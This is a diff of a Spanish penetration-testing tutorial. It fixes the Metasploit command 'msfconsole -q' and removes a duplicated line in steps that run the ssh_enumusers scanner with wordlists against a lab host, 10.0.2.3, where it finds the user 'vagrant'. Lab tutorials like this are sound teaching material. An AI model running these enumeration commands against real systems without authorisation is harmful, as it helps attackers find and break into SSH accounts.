@@ -93,7 +93,7 @@ Descargaremos 2 diccionarios uno para los Usernames y otro para los Passwords.
 Para realizar esta acción, vamos a correr un scanner de enumeración con la herramienta Metasploit.
 
 ```
-msf console -q
+msfconsole -q
 use auxiliary/scanner/ssh/ssh_enumusers
 set RHOSTS 10.0.2.3
 set USER_FIlE /home/user/Downloads/top-usernames-shortlist.txt
@@ -111,7 +111,6 @@ En el resultado obtenido nos indica que el usuario que reconocio es `vagrant`, p
 Para esta acción usaremos el siguiente comando, considerando que seguimos dentro del `msf console -q`
 
 ```
-msf console -q
 use auxiliary/scanner/ssh/ssh_enumusers
 set RHOSTS 10.0.2.3
 set USERNAME vagrant
